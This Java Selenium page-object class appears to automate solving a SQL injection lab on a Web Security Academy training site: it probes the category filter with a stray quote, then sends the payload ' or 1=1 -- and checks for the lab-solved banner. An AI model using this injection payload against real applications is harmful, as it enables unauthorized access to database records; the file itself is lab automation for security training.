package sa.osama_alharbi.cyber.pages.SQLInj;

import io.qameta.allure.Step;
import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.Assertions;
import org.openqa.selenium.By;
import sa.osama_alharbi.cyber.core.TestBase;
import sa.osama_alharbi.cyber.service.ActionsBotService;

@Slf4j
public class SQLInjectionLab1Page {
    private final TestBase base;
    private final ActionsBotService bot;
    private final String url;

    public SQLInjectionLab1Page(TestBase base, String subDomain) {
        this.base = base;
        this.bot = this.base.actionsBotService;
        this.url = "https://"+subDomain+".web-security-academy.net/";
    }

    @Step("Go To")
    public SQLInjectionLab1Page goTo(){
        bot.navigate(url);
        return this;
    }

    @Step("Check is not solved")
    public SQLInjectionLab1Page checkIsNotSolved(){
        bot.capturingScreenshotEvidence(By.cssSelector("div.widgetcontainer-lab-status"),By.cssSelector("div.widgetcontainer-lab-status>p"));
        Assertions.assertTrue(bot.getText(By.cssSelector("div.widgetcontainer-lab-status>p")).equals("Not solved"),"How we can start SQL injection vulnerability and it solved");
        return this;
    }

    @Step("Check is solved")
    public SQLInjectionLab1Page checkIsSolved(){
        bot.capturingScreenshotEvidence(By.cssSelector("div.widgetcontainer-lab-status"),By.cssSelector("div.widgetcontainer-lab-status>p"));
        Assertions.assertTrue(bot.getText(By.cssSelector("div.widgetcontainer-lab-status>p")).equals("Solved"),"SQL injection vulnerability is Not Solved");
        return this;
    }

    @Step("find the vulnerability")
    public SQLInjectionLab1Page findVulnerability(){
        bot.navigate(url+"filter?category=Corporate+gifts'");
        bot.capturingScreenshotEvidence(By.tagName("body"),By.cssSelector("div.is-page"));
        Assertions.assertEquals("Internal Server Error",bot.getText(By.cssSelector("p.is-warning")),"there is no SQL injection vulnerability");
        return this;
    }

    @Step("start attack")
    public SQLInjectionLab1Page attack(){
        bot.navigate(url+"filter?category=Corporate+gifts' or 1=1 --");
        bot.waitDisplay(By.id("notification-labsolved"));
        bot.capturingScreenshot(By.id("notification-labsolved"));
        return this;
    }
}
